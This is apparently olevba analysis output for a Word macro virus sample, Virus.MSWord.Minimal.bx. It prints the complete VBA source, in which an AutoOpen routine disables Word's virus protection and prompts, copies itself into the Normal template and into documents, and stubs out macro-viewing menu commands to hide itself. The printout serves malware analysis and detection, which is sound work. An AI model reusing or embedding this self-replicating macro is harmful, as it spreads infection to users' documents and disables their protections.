olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.bx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.bx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO tot.bas 
in file: Virus.MSWord.Minimal.bx - OLE stream: 'Macros/VBA/tot'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen(): On Error Resume Next: Application.EnableCancelKey = 0: Application.ShowVisualBasicEditor = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0: a = ActiveDocument.FullName: n = NormalTemplate.FullName: Application.OrganizerCopy Source:=a, Destination:=n, Name:="tot", Object:=wdOrganizerObjectProjectItems: NormalTemplate.Save: Application.OrganizerCopy Source:=n, Destination:=a, Name:="tot", Object:=wdOrganizerObjectProjectItems: ActiveDocument.Save: End Sub
Sub ToolsRecordMacroToggle(): End Sub
Sub ToolsRecordMacroStart(): End Sub
Sub FileSave(): AutoOpen: End Sub
Sub FileTemplates(): End Sub
Sub ToolsMacro(): End Sub
Sub ViewVBcode(): End Sub
Sub Organizer(): End Sub

'         MMM            MMMMMMMMM                 MM
'       MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM
'        MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM
'         MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM
'         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
'         MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
'         MMM        MMMMMMMMMMMMM           MMMMMMMMMM
'         MMM        MMMMMMMMMMM    RUSSIA     MMMMMMMM
'          MM         MMMMMMMM               M  MMMMMMM
'          MM        MMMMMMMMM             MMM   MMMMMM
'                   MMMMMMMMMMMMMM      MMMMM    MMMMMM
'          MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM
'         MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM
'        MMMMMMMMMM                                MM
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+----------+--------------------+---------------------------------------------+

